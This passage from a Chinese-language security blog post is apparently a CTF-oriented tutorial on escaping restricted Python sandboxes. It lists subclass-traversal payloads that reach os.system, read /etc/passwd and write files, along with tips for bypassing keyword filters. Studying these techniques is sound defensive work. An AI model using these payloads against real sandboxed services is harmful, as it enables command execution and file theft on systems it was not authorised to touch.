class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line"><span class="string">""</span>.__class__.__mro__[<span class="number">-1</span>].__subclasses__()[<span class="number">29</span>].__call__(eval,<span class="string">'os.system("ls"))</span></span><br></pre></td></tr></table></figure>

<h5 id="python3中的payload"><a href="#python3中的payload" class="headerlink" title="python3中的payload"></a>python3中的payload</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">-4</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br><span class="line"></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">93</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">104</span>].__init__.__globals__[<span class="string">"sys"</span>].modules[<span class="string">"os"</span>].system(<span class="string">"ls"</span>)</span><br><span class="line"></span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">127</span>].__init__.__globals__[<span class="string">'system'</span>](<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<h4 id="逃逸思路总结"><a href="#逃逸思路总结" class="headerlink" title="逃逸思路总结"></a>逃逸思路总结</h4><p>在遇到一个如下的<code>python</code>沙箱环境下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line">banned = [</span><br><span class="line">    <span class="string">"import"</span>,</span><br><span class="line">    <span class="string">"exec"</span>,</span><br><span class="line">    <span class="string">"eval"</span>,</span><br><span class="line">    <span class="string">"pickle"</span>,</span><br><span class="line">    <span class="string">"os"</span>,</span><br><span class="line">    <span class="string">"subprocess"</span>,</span><br><span class="line">    <span class="string">"kevin sucks"</span>,</span><br><span class="line">    <span class="string">"input"</span>,</span><br><span class="line">    <span class="string">"banned"</span>,</span><br><span class="line">    <span class="string">"cry sum more"</span>,</span><br><span class="line">    <span class="string">"sys"</span></span><br><span class="line">]</span><br><span class="line">targets = __builtins__.__dict__.keys()</span><br><span class="line">targets.remove(<span class="string">'raw_input'</span>)</span><br><span class="line">targets.remove(<span class="string">'print'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> targets:</span><br><span class="line">    <span class="keyword">del</span> __builtins__.__dict__[x]</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    print(<span class="string">"&gt;&gt;&gt;"</span>, end=<span class="string">' '</span>)</span><br><span class="line">    data = raw_input()</span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> banned:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> data.lower():</span><br><span class="line">            print(<span class="string">"No bueno"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># this means nobreak</span></span><br><span class="line">        <span class="keyword">exec</span> data</span><br></pre></td></tr></table></figure>

<p>大概逻辑就是把内联函数中除了<code>raw_input</code>，<code>print</code>，把其他的全部过滤掉了，所以想到可以<code>reload</code>，但是这里是删除了所有，所以<code>reload</code>也被删掉了，所以想到可以<code>import imp</code>.但是<code>import</code>又被ban掉了，所以这里只能通过引入其他类的危险函数去打穿沙箱了。</p>
<ul>
<li>首先通过<code>().__class__.__bases__[0].__subclasses__()</code>查看一下所有子类，如果有<code>file</code>对象的话可以读写文件通过下面的<code>payload</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#读文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/etc/passwd'</span>).read()</span><br><span class="line"><span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'file'</span>](<span class="string">'/etc/passwd'</span>).read() </span><br><span class="line"><span class="comment">#写文件</span></span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">'/var/www/html/flag'</span>, <span class="string">'w'</span>).write(<span class="string">'flag&#123;sandbox_is_so_cool&#125;'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>如果子类中有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>，可以通过<code>().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__</code>,发现两个很有用的方法属性，就是<code>__builtins__</code>和<code>linecache</code></li>
</ul>
<p><strong><code>__builtins__</code>的操作有</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.values()[<span class="number">13</span>][<span class="string">'eval'</span>](<span class="string">'__import__("os").system("ls")'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'__import__'</span>](<span class="string">'os'</span>).system(<span class="string">'ls'</span>)</span><br><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>]()._module.__builtins__[<span class="string">'__import__'</span>](<span class="string">"os"</span>).system(<span class="string">"ls"</span>)</span><br></pre></td></tr></table></figure>

<p><strong>linecache是一个很神奇的模块</strong></p>
<p>通过<code>dir()</code>可以发现</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'__all__'</span>, <span class="string">'__builtins__'</span>, <span class="string">'__doc__'</span>, <span class="string">'__file__'</span>, <span class="string">'__name__'</span>, <span class="string">'__package__'</span>, <span class="string">'cache'</span>, <span class="string">'checkcache'</span>, <span class="string">'clearcache'</span>, <span class="string">'getline'</span>, <span class="string">'getlines'</span>, <span class="string">'os'</span>, <span class="string">'sys'</span>, <span class="string">'updatecache'</span>]</span><br></pre></td></tr></table></figure>

<p>这里是存在os模块的，所以我们可以通过os进行系统命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals[<span class="string">'linecache'</span>].os.system(<span class="string">'ls'</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>其他类中的命令执行</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>

<p>所以说，最引入<code>object</code>进行沙箱逃逸，首先要通过<code>subclasses</code>找到当前的子类，有<code>file</code>对象的话就用<code>file</code>写，读文件;有<code>&lt;class &#39;warnings.catch_warnings&#39;&gt;</code>的话用<code>__globals__</code>去找那两个关键属性方法,<code>linecache</code>和<code>__builtins__</code>，通过<code>linecache</code>进行引入os模块命令执行，通过<code>__builtins__</code>引入<code>eval</code>，或者<code>__import__</code>，进行命令执行,如果都不行的话可以考虑</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">71</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">76</span>].__init__.__globals__[<span class="string">'os'</span>]</span><br></pre></td></tr></table></figure>

<h4 id="绕过过滤小tips"><a href="#绕过过滤小tips" class="headerlink" title="绕过过滤小tips"></a>绕过过滤小tips</h4><ul>
<li>. 可替换为<code>getattr()</code></li>
<li>_ 可替换为<code>dir[0][0][0]</code></li>
</ul>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.smi1e.top/python-沙箱逃逸/" target="_blank" rel="noopener">https://www.smi1e.top/python-%e6%b2%99%e7%ae%b1%e9%80%83%e9%80%b8/</a></p>
<p><a href="http://yulige.top/?p=502" target="_blank" rel="noopener">http://yulige.top/?p=502</a></p>
<p><a href="http://shaobaobaoer.cn/archives/656/python-sandbox-escape" target="_blank" rel="noopener">http://shaobaobaoer.cn/archives/656/python-sandbox-escape</a></p>
<p><a href="https://hatboy.github.io/2018/04/19/Python沙箱逃逸总结/" target="_blank" rel="noopener">https://hatboy.github.io/2018/04/19/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E6%80%BB%E7%BB%93/</a></p>
<p><a href="https://xz.aliyun.com/t/2308" target="_blank" rel="noopener">https://xz.aliyun.com/t/2308</a></p>

      
    </div>
    <footer class="article-footer">
      
        <a data-url="http://yoursite.com/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" data-id="ckabsu38g001qkkvr0tue88fu" class="article-share-link" data-share="baidu" data-title="Python沙箱逃逸">Share</a>
      

      
        <a href="http://yoursite.com/2019/07/06/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/#ds-thread" class="article-comment-link">Comments</a>
      

      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  


  <nav id="page-nav">
    <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
  </nav>
</section>
      
      <aside id="sidebar">
  
    
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tags</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a><span class="tag-list-count">30</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB%E5%AE%89%E5%85%A8/" rel="tag">WEB安全</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a><span class="tag-list-count">7</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a><span class="tag-list-count">26</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/XSS/" rel="tag">XSS</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" rel="tag">生活随笔</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%9A%8F%E7%AC%94/" rel="tag">随笔</a><span class="tag-list-count">1</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Tag Cloud</h3>
    <div class="widget tagcloud">
      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Crypto/" style="font-size: 12.5px;">Crypto</a> <a href="/tags/WEB%E5%AE%89%E5%85%A8/" style="font-size: 10px;">WEB安全</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 17.5px;">Web安全</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">生活随笔</a> <a href="/tags/%E9%9A%8F%E7%AC%94/" style="font-size: 10px;">随笔</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">April 2020</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/03/">March 2020</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">February 2020</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">January 2020</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">December 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">November 2019</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/09/">September 2019</a><span class="archive-list-count">5</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/08/">August 2019</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a><span class="archive-list-count">12</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/06/">June 2019</a><span class="archive-list-count">21</span></li></ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2020/05/13/Apache-Common-Collections-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0/">Apache Common Collections 反序列化分析学习</a>
          </li>
        
          <li>
            <a href="/2020/05/12/intigriti-Easter-XSS-challenge/">intigriti Easter XSS challenge</a>
          </li>
        
          <li>
            <a href="/2020/04/22/VolgaCTF-2020-Qualifier-Web/">VolgaCTF 2020 Qualifier-Web</a>
          </li>
        
          <li>
            <a href="/2020/04/15/DOM-Clobbering-Attack/">DOM Clobbering Attack</a>
          </li>
        
          <li>
            <a href="/2020/04/09/Javascript%E4%B8%AD%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E%E5%B8%A6%E6%9D%A5%E7%9A%84Tags-Broken/">Javascript中变量声明带来的Tags Broken</a>
          </li>
        
      </ul>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Links</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="http://arvinxiang.com" target="_blank">主题作者</a>
          </li>
        
          <li>
            <a href="http://reqianduan.com" target="_blank">热前端</a>
          </li>
        
          <li>
            <a href="http://yuancheng.work" target="_blank">远程.work</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
      
    </div>
    <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2020 离怀秋<br>
      Powered by <a href="//hexo.io/" target="_blank">Hexo</a>
      .
      Theme by <a href="https://github.com/xiangming/landscape-plus" target="_blank">Landscape-plus</a>
    </div>
  </div>
</footer>
  </div>
  <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
  <!-- totop start -->
<div id="totop">
<a title="totop"><img src="/img/scrollup.png"/></a>
</div>

<!-- totop end -->

<!-- 多说公共js代码 start -->
<script type="text/javascript">
var duoshuoQuery = {short_name:"reqianduan"};
  (function() {
    var ds = document.createElement('script');
    ds.type = 'text/javascript';ds.async = true;
    ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
    ds.charset = 'UTF-8';
    (document.getElementsByTagName('head')[0]
     || document.getElementsByTagName('body')[0]).appendChild(ds);
  })();
  </script>
<!-- 多说公共js代码 end -->


<!-- 百度分享 start -->

<div id="article-share-box" class="article-share-box">
  <div id="bdshare" class="bdsharebuttonbox article-share-links">
    <a class="article-share-weibo" data-cmd="tsina" title="分享到新浪微博"></a>
    <a class="article-share-weixin" data-cmd="weixin" title="分享到微信"></a>
    <a class="article-share-qq" data-cmd="sqq" title="分享到QQ"></a>
    <a class="article-share-renren" data-cmd="renren" title="分享到人人网"></a>
    <a class="article-share-more" data-cmd="more" title="更多"></a>
  </div>
</div>
<script>
  function SetShareData(cmd, config) {
    if (shareDataTitle && shareDataUrl) {
      config.bdText = shareDataTitle;
      config.bdUrl = shareDataUrl;
    }
    return config;
  }
  window._bd_share_config={
    "common":{onBeforeClick: SetShareData},
    "share":{"bdCustomStyle":"/css/bdshare.css"}
  };
  with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='//bdimg.share.baidu.com/static/api/js/share.js?cdnversion='+~(-new Date()/36e5)];
</script>

<!-- 百度分享 end -->

<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>





<script src="/js/script.js"></script>


</div>
<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":200,"height":300},"mobile":{"show":false},"log":false});</script></body>
</html>
